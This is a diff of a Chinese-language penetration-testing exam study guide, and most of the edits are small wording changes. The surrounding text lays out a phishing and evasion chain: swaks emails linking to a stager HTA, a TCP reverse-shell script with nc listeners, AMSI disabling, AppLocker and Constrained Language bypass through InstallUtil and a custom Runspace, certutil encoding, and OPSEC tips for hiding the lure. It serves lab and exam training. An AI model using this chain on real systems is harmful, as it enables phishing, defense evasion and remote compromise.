@@ -6,6 +6,8 @@
 
 > **覆盖场景：** 6、7、8
 >
+> **教材依据：** 第 13 章（§13.3.1–13.3.3 PowerShell CLM、自定义 Runspace 与 InstallUtil、§13.4 用 C# 绕过 AppLocker、§13.5 JScript 与 MSHTA）、第 12 章（§12.2–12.4 AMSI）
+>
 > **前置依赖：** 攻击机上可被目标访问的 HTTP 服务（Kali `python3 -m http.server` 即可）；一个能编译 .NET Framework 的 Windows 环境（实验网任意 Win10 或自备 Windows VM，用于产出 `m02-clm-bypass-runspace.exe`）；邮件投递链路（swaks/sendEmail，见场景 6）。
 
 **本文档三个场景的关系**：场景 6 是"HTA 当第一阶段，目标有 AppLocker 无 Office"；场景 7 是"AppLocker + CLM + AMSI 全开"，需要把 HTA、InstallUtil 兼容程序集、自定义 Runspace、AMSI 处理、第二阶段 Runner **组合**起来验证；场景 8 是"同一链路下载+执行合在一起不工作，拆开才工作"的**时序/生命周期排错**——不要一上来就怪杀软。三者共用同一套文件，差别在组合方式与排错顺序。
@@ -28,9 +30,9 @@
    python3 -m http.server 80     # 或 8080，注意 URL 里写全
    nc -lvnp LPORT                # 第二阶段的回连监听
    ```
-2. 预先准备好第二阶段脚本 `shell.ps1`（老而稳的 TCP 回连，见 cheat sheet `C# for CLM Bypass with PS Script` 里的 shell.ps1 模板；场景 6 无 CLM 时可直接用），替换其中 `[ATTACKER_IP]`/`[PORT]` 为 `LHOST`/`LPORT` 后放 web 根目录。
+2. 预先准备好第二阶段脚本 `shell.ps1`（老而稳的 TCP 回连，见速查章节 `C# for CLM Bypass with PS Script` 里的 shell.ps1 模板；场景 6 无 CLM 时可直接用），替换其中 `[ATTACKER_IP]`/`[PORT]` 为 `LHOST`/`LPORT` 后放 web 根目录。
 3. 按场景 7 的方法预编译 **x86 与 x64 两个** InstallUtil 兼容 runner（`m02-clm-bypass-runspace.cs`），本场景作为兜底备选。
-4. 邮件投递（cheat sheet `HTA` 一节；URL 形式优于附件，附件常被过滤器拦）：
+4. 邮件投递（速查笔记 `HTA` 一节；URL 形式优于附件，附件常被过滤器拦）：
    ```bash
    # 发"链接"诱导点击（推荐）：HTA 放在 web 根，正文只给 http://LHOST/stager.hta
    swaks --body 'Please click here http://LHOST/stager.hta' \
@@ -379,7 +381,7 @@ namespace M02
 **失败分支与备选**：
 - 如果 `mshta.exe` 被 AppLocker 拒（策略连 System32 都收紧）→ 改走 `cscript/wscript` 的 JScript 路线（见 M03 场景 9-10），或换一个默认放行的签名宿主。
 - 如果 `.hta` 附件被邮件网关过滤 → 只发链接，HTA 放 web 根；或把链接写成 `C:\Windows\System32\mshta.exe http://LHOST/stager.hta` 形式的快捷方式再诱导。
-- 如果 `DownloadString` 被拦（AMSI/Defender 对 IEX 内容扫描）→ 先跑 `Disable AMSI`（cheat sheet 同名单节）再 IEX，或直接切场景 7 的组合链。
+- 如果 `DownloadString` 被拦（AMSI/Defender 对 IEX 内容扫描）→ 先跑 `Disable AMSI`（速查笔记 同名单节）再 IEX，或直接切场景 7 的组合链。
 - 如果出网只有代理 → shell.ps1 里改用 `[System.Net.WebRequest]::DefaultWebProxy` 显式挂代理（详见 M09 场景 28）。
 
 **考试注意 / OPSEC**：HTA 会在桌面闪现一个窗口——用 `<HTA:APPLICATION ... WINDOWSTATE="minimize">` 且脚本末尾 `self.close()`，不要让窗口停在用户眼前；邮件正文不要出现真实攻击机域名，用诱惑性业务话术；先跑无害回调、后跑 payload，避免"假入口"上浪费一整个邮件回合。
@@ -393,7 +395,7 @@ namespace M02
 **前提与假设**：AppLocker 默认规则放行 System32 下签名程序：`mshta.exe`、`powershell.exe`（但进 CLM）、`csc.exe`、`InstallUtil.exe`；脚本文件（.ps1）被脚本规则/语言模式限制，不能直接 `powershell -File`。自定义 Runspace 是关键：由非 powershell.exe 进程（InstallUtil 承载的 .NET 程序）创建 `System.Management.Automation.Runspaces`，该引擎在 FullLanguage 下运行，且不受 AppLocker 脚本规则约束。
 
 **准备（攻击机侧）**：
-1. `shell.ps1` 改进版：在 cheat sheet 回连模板（`C# for CLM Bypass with PS Script` 一节）**首行插入 AMSI 处理**（FullLanguage 下 `amsiInitFailed` 反射法有效），再放回连代码；替换 `LHOST/LPORT`。Host 到 web 根。
+1. `shell.ps1` 改进版：在 速查笔记 回连模板（`C# for CLM Bypass with PS Script` 一节）**首行插入 AMSI 处理**（FullLanguage 下 `amsiInitFailed` 反射法有效），再放回连代码；替换 `LHOST/LPORT`。Host 到 web 根。
 2. 在 Windows 编译机上产出 runner（x64 与 x86 各一）：
    ```bat
    :: x64（目标为 64 位系统的首选）
@@ -407,12 +409,12 @@ namespace M02
      /r:System.Management.Automation.dll /r:System.Configuration.Install.dll ^
      m02-clm-bypass-runspace.cs
    ```
-   若 `/r:System.Management.Automation.dll` 解析失败，到 GAC 找全路径引用：`C:\Windows\assembly\GAC_MSIL\System.Management.Automation\<版本>__31bf3856ad364e35\System.Management.Automation.dll`。还要给项目加 `System.Configuration.Install` 引用（cheat sheet 同节注明 VS 里容易漏）。
-3. 可选：对 exe 做 `certutil -encode m02stage64.exe enc.txt`，让 runner 能以文本形式过邮件/下载链（目标侧再 `certutil -decode`，见 cheat sheet 步骤）。
+   若 `/r:System.Management.Automation.dll` 解析失败，到 GAC 找全路径引用：`C:\Windows\assembly\GAC_MSIL\System.Management.Automation\<版本>__31bf3856ad364e35\System.Management.Automation.dll`。还要给项目加 `System.Configuration.Install` 引用（速查笔记 同节注明 VS 里容易漏）。
+3. 可选：对 exe 做 `certutil -encode m02stage64.exe enc.txt`，让 runner 能以文本形式过邮件/下载链（目标侧再 `certutil -decode`，见速查章节 步骤）。
 4. 把 exe/enc.txt、shell.ps1 全部放到 Kali web 根；启动 `python3 -m http.server` 与 `nc -lvnp LPORT`。
 
 **执行步骤**：
-1. 侦察确认三件事都在（用 `m00-recon-defenses.ps1`）：AppLocker 有效规则、语言模式 `ConstrainedLanguage`、`amsi.dll` 是否进进程（cheat sheet `Enumerate Defenses`/`Disable AMSI`）。三者齐备才值得上本链路。
+1. 侦察确认三件事都在（用 `m00-recon-defenses.ps1`）：AppLocker 有效规则、语言模式 `ConstrainedLanguage`、`amsi.dll` 是否进进程（速查笔记 `Enumerate Defenses`/`Disable AMSI`）。三者齐备才值得上本链路。
 2. 先跑 `m02-hta-callback.hta` 确认 mshta 宿主本身没被策略/杀软按进程名拦（回调 `GET /cb` 出现即可）。
 3. 用 `m02-hta-embedded-clm-bypass.hta`（单文件、内嵌 C# 源码 + 目标机 csc 现编译 + InstallUtil /U 触发）或手工执行等价的"下载→解码→InstallUtil"链：
    ```
@@ -587,7 +589,7 @@ namespace Payload
 - 若 AMSI 处理那行被拦（`AmsiUtils` 字符串本身是特征）→ 换 `Disable AMSI` 一节的其他反射写法或拆串拼接，并保持与宿主进程位数一致。
 - 若整条链在真实目标上"分开的环节各自单独验证都过、串起来没反应" → 按场景 8 排时序，不预设是杀软。
 
-**考试注意 / OPSEC**：三件套组合链**必须在实验网完整走一遍**再上考场——顺序、位数、引用缺失、InstallUtil 路径任何一个没验过都是时间黑洞；runner 与 shell.ps1 用 x64/x86 双份并按目标实测；避免 Meterpreter 大载荷，简单 TCP 回连 + AMSI 处理最稳（cheat sheet 注明 AMSI 开启时部分样本不工作）；HTA 会短暂闪窗，用 minimize + 立即 `self.close()`。
+**考试注意 / OPSEC**：三件套组合链**必须在实验网完整走一遍**再上考场——顺序、位数、引用缺失、InstallUtil 路径任何一个没验过都是时间黑洞；runner 与 shell.ps1 用 x64/x86 双份并按目标实测；避免 Meterpreter 大载荷，简单 TCP 回连 + AMSI 处理最稳（速查笔记 注明 AMSI 开启时部分样本不工作）；HTA 会短暂闪窗，用 minimize + 立即 `self.close()`。
 
 ---
 
